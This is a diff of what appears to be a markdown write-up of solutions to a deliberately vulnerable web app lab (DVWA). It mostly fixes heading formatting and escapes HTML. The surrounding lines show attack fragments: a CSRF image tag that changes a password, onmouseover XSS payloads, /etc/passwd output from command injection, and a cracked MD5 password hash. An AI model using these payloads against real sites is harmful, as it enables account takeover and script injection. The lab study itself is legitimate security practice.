@@ -7,7 +7,7 @@ categories=["vulnerable-web-app"]
 tags=["web"]
 +++
 
-#Brute force
+# Brute force
 
 Low:
 
@@ -20,7 +20,7 @@ High:
 
 Running burp intruder and grepping for csrf tokens and default password list as a payload, pitch fork for targeting
 
-#Command Injection
+# Command Injection
 
 Low:
 
@@ -112,19 +112,19 @@ systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
 mysql:x:104:107:MySQL Server,,,:/nonexistent:/bin/false
 ```
 
-#CSRF
+# CSRF
 
 Low: 
 
 ```html
-<html><head><title></title></head><body><img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=password&password_conf=password" /></body></html>
+<html><head><title></title></head><body>&lt;img src="http://127.0.0.1/vulnerabilities/csrf/?password_new=password&password_conf=password" /&gt;</body></html>
 ```
 
 Medium:
 
 High:
 
-#File Inclusion
+# File Inclusion
 
 Low:
 
@@ -165,7 +165,7 @@ Medium:
 High:
 
 
-#SQLi
+# SQLi
 
 Low:
 
@@ -227,7 +227,7 @@ First name: smithy
 Surname: 5f4dcc3b5aa765d61d8327deb882cf99
 
 
-#SQLi Blind
+# SQLi Blind
 
 Low:
 
@@ -248,7 +248,7 @@ High:
 ```
 
 
-#XSS Reflected
+# XSS Reflected
 
 Low:
 
@@ -262,7 +262,7 @@ High:
 
 &lt;a href="#" onmouseover="alert(1)"&gt;adf&lt;/a&gt;
 
-#XSS Stored
+# XSS Stored
 
 Low:
 
@@ -283,5 +283,5 @@ High:
 
 Message: 
 ```html
-<a href="#" onmouseover="alert(1)">adf</a>
+&lta href="#" onmouseover="alert(1)"&gt;adf&lt;/a&gt;
 ```
